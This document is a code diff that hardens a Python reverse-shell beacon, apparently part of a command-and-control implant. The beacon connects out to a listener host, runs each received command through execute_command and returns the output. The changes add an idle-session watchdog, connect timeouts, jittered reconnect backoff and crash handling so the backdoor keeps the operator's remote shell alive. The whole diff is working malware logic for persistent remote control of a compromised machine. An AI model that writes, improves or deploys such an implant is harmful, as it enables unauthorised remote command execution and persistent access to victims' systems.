@@ -3662,48 +3662,151 @@ def _enable_tcp_keepalive(sock: socket.socket) -> None:
         pass
 
 
+# ===== BEACON SESSION / CONNECTION GUARDIAN =====
+# TCP keepalive (_enable_tcp_keepalive) turns a silently-dead link into a
+# recv error in ~30s. The guardian below is the second line of defence for
+# cases keepalive cannot prove dead (a middlebox that answers probes but
+# never forwards data): a registered session silent for GUARD_IDLE_MAX is
+# force-closed from the watchdog thread, which makes the peer's blocked
+# recv() fail and re-enters the reconnect loop. The idle window is long so
+# a quiet-but-alive listener is not disturbed; an active C2 just reconnects
+# instantly anyway. _conn_drop is also the single choke point the power
+# hook / coordinator use to restart a stale session after resume.
+CONNECT_TIMEOUT = 10          # per-attempt bound for one TCP connect()
+GUARD_INTERVAL = 15           # watchdog cadence while a session is up
+GUARD_IDLE_MAX = 300          # force-reconnect after this long without data
+_conn_state = {
+    "lock": threading.Lock(),
+    "sock": None,             # currently registered session socket
+    "up": False,              # a session is registered and being served
+    "sess": 0,                # session serial (beacon-log correlation)
+    "beat": 0.0,              # last connect/recv activity
+}
+
+
+def _conn_register(sock) -> int:
+    with _conn_state["lock"]:
+        _conn_state["sock"] = sock
+        _conn_state["up"] = True
+        _conn_state["sess"] += 1
+        _conn_state["beat"] = time.time()
+        return _conn_state["sess"]
+
+
+def _conn_touch() -> None:
+    """Refresh the watchdog clock. Called on every received command;
+    long-running self-initiated work can call it too so a busy session is
+    never mistaken for a dead one."""
+    with _conn_state["lock"]:
+        if _conn_state["up"]:
+            _conn_state["beat"] = time.time()
+
+
+def _conn_drop(reason: str) -> None:
+    """Deregister and force-close the current session. Safe from any
+    thread (watchdog / power hook / connect loop): closing a socket a peer
+    thread is blocked in makes its recv() fail, so the reconnect loop
+    always notices. Logs exactly one session-DOWN line per live session."""
+    with _conn_state["lock"]:
+        sock = _conn_state["sock"]
+        sess = _conn_state["sess"]
+        up = _conn_state["up"]
+        _conn_state["sock"] = None
+        _conn_state["up"] = False
+        _conn_state["beat"] = 0.0
+    if sock is not None:
+        try:
+            sock.shutdown(socket.SHUT_RDWR)
+        except OSError:
+            pass
+        try:
+            sock.close()
+        except OSError:
+            pass
+    if up:
+        _beacon_log("[beacon] session DOWN #%d (%s) - reconnecting"
+                    % (sess, reason))
+
+
+def _conn_guard() -> None:
+    """Watchdog for the beacon session (daemon, one per process)."""
+    while True:
+        time.sleep(GUARD_INTERVAL)
+        try:
+            with _conn_state["lock"]:
+                sock = _conn_state["sock"]
+                up = _conn_state["up"]
+                beat = _conn_state["beat"]
+            if up and sock is not None and beat \
+                    and time.time() - beat > GUARD_IDLE_MAX:
+                _conn_drop("silent %.0fs (watchdog)" % (time.time() - beat))
+        except Exception:
+            pass
+
+
 def connect() -> None:
     """Main loop - connect, execute commands, reconnect on failure.
 
-    Runs forever: if the listener drops the session (clean close, reset, or a
-    silently-dead link surfaced by TCP keepalive), the socket is closed and
-    the beacon keeps retrying with a jittered backoff until the listener is
-    back - then it stops retrying and serves normally.
+    Runs forever: the connect attempt is bounded by CONNECT_TIMEOUT, TCP
+    keepalive surfaces silently-dead links, and the guardian force-closes a
+    session silent for GUARD_IDLE_MAX so the loop always makes progress
+    instead of blocking in recv() indefinitely. Session drops and
+    re-establishes are recorded in the target-side admin log.
     """
+    threading.Thread(target=_conn_guard, daemon=True, name="cguard").start()
     delay = float(RECONNECT_DELAY)
     while True:
+        sock = None
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(CONNECT_TIMEOUT)      # bounded connect attempt
             sock.connect((LHOST, LPORT))
+            sock.settimeout(None)                 # blocking recv below
             _enable_tcp_keepalive(sock)
-        except (ConnectionRefusedError, OSError):
+        except (ConnectionRefusedError, socket.timeout, socket.gaierror,
+                OSError):
+            if sock is not None:
+                try:
+                    sock.close()
+                except OSError:
+                    pass
+            # listener down: silent jittered backoff, no per-attempt spam
             time.sleep(delay * random.uniform(0.75, 1.25))
-            # back off gradually (cap 60s) so a down listener isn't hammered
             delay = min(delay * 1.5, 60.0)
             continue
 
         # connected: stop retrying, reset backoff for the next drop
         delay = float(RECONNECT_DELAY)
-
+        sess = _conn_register(sock)
+        _beacon_log("[beacon] session UP #%d" % sess)
+        drop_reason = "connection error"
         try:
             while True:
                 data = sock.recv(BUFFER)
                 if not data:
+                    drop_reason = "listener closed"
                     break
-
+                _conn_touch()
                 cmd = data.decode("utf-8", errors="replace").strip()
                 if not cmd:
                     continue
-
-                output = execute_command(cmd)
-                sock.sendall(output)
-        except (ConnectionResetError, OSError):
+                try:
+                    output = execute_command(cmd)
+                except Exception:
+                    output = b"[!] command handler crashed\n" + MARKER
+                try:
+                    sock.sendall(output)
+                except OSError:
+                    drop_reason = "send failed"
+                    break
+        except (ConnectionResetError, OSError, socket.timeout):
             pass
         finally:
             try:
                 sock.close()
             except OSError:
                 pass
+        _conn_drop(drop_reason)
 
         time.sleep(RECONNECT_DELAY)
 
